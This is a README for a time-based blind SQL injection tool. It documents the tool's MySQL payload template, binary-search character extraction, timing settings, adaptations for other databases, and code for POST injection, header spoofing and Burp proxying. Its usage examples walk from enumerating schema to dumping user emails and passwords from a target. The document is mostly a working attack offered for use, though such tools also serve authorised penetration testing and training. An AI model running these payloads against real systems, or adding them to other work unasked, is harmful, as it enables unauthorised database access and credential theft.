# blind_sqli.py

Time-based blind SQL injection extraction tool using binary search. Built for scenarios where UNION-based injection isn't viable (e.g., the application doesn't render injected rows) and automated tools like sqlmap fail to detect the injection point.

## Features

- **Binary search extraction** — ~7 requests per character instead of ~95 with linear search
- **Configurable timing** — Adjustable sleep/threshold values to handle network jitter
- **Arbitrary query support** — Pass any SQL query as an argument
- **Minimal dependencies** — Just `requests`

## Install

```bash
git clone https://github.com/YourUser/blind-sqli.git
cd blind-sqli
pip install requests
```

## Usage

```bash
# Extract current database name (default query)
python3 blind_sqli.py

# Extract specific data
python3 blind_sqli.py "database()"
python3 blind_sqli.py "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='targetdb'"
python3 blind_sqli.py "SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='targetdb' AND table_name='users'"
python3 blind_sqli.py "SELECT GROUP_CONCAT(email,0x3a,password SEPARATOR 0x7c) FROM users"
```

## Configuration

Edit the variables at the top of the script to match your target:

```python
URL = "http://TARGET/vulnerable-endpoint.php"
COOKIE = {"PHPSESSID": "your-session-cookie"}
SLEEP_TIME = 5    # seconds the DB sleeps on TRUE
THRESHOLD = 4     # seconds — response longer than this = TRUE
```

| Variable | Description | Default |
|----------|-------------|---------|
| `URL` | Target endpoint with the injectable parameter | — |
| `COOKIE` | Session cookies for authenticated requests | — |
| `SLEEP_TIME` | `SLEEP()` duration injected on TRUE conditions | `5` |
| `THRESHOLD` | Response time cutoff to distinguish TRUE/FALSE | `4` |

### Tuning the Timing

If you're getting garbled output, your threshold is too tight. The gap between `SLEEP_TIME` and `THRESHOLD` needs to account for normal response time + network latency:

```
SLEEP_TIME=3 / THRESHOLD=2  →  garbled (network jitter causes false positives)
SLEEP_TIME=5 / THRESHOLD=4  →  clean results
```

Start with `5/4`. If the target is on localhost or a fast network, you can try `3/2` for speed.

## How It Works

The script uses a binary search over the ASCII range (32–126) for each character position in the query result:

```
Payload: 1 AND IF(ORD(SUBSTRING(({query}),{pos},1))>{mid}, SLEEP(5), 0)
```

1. For each character position, split the ASCII range in half
2. If `SLEEP()` fires (response delayed), the character's ASCII value is in the upper half
3. If no delay, it's in the lower half
4. Repeat until the range narrows to one character
5. A null byte (ASCII 32) signals end of string

```
Position 1: 32-126 → 79 → 111 → 95 → 103 → 107 → 109 → 110 = 'n'
Position 2: 32-126 → ...                                      = 'y'
...
```

### Request Math

Each character takes `log2(94) ≈ 7` requests. For a 50-character result:

- **Binary search:** ~350 requests, ~15 min at 5s sleep
- **Linear search:** ~2,350 requests, ~1.5 hours

## Payload Format

The default payload template targets MySQL:

```sql
1 AND IF(ORD(SUBSTRING(({query}),{pos},1))>{mid}, SLEEP({SLEEP_TIME}), 0)
```

To adapt for other databases:

| Database | Sleep Function | Notes |
|----------|---------------|-------|
| MySQL | `SLEEP(n)` | Default |
| PostgreSQL | `pg_sleep(n)` | Change `SLEEP` to `pg_sleep` |
| MSSQL | `WAITFOR DELAY '0:0:n'` | Requires restructuring the payload |
| SQLite | N/A | No native sleep — use heavy queries instead |

## Limitations

- **Speed** — Time-based extraction is inherently slow. Each TRUE condition costs `SLEEP_TIME` seconds.
- **Single-threaded** — Requests are sequential. Parallelizing would require careful handling to avoid stacking `SLEEP()` calls on the server.
- **MySQL-specific** — Default payload uses MySQL syntax. See the table above for other DBs.
- **GET only** — Currently sends payloads via GET parameters. Modify `check()` for POST injection points.

## Extending

**POST parameters:**
```python
def check(payload):
    data = {"id": payload, "action": "add"}
    start = time.time()
    requests.post(URL, data=data, cookies=COOKIE, allow_redirects=False)
    return time.time() - start > THRESHOLD
```

**Custom headers:**
```python
HEADERS = {"X-Forwarded-For": "127.0.0.1"}
requests.get(URL, params=params, cookies=COOKIE, headers=HEADERS, allow_redirects=False)
```

**Proxy through Burp:**
```python
PROXIES = {"http": "http://127.0.0.1:8080"}
requests.get(URL, params=params, cookies=COOKIE, proxies=PROXIES, verify=False)
```

## License

MIT
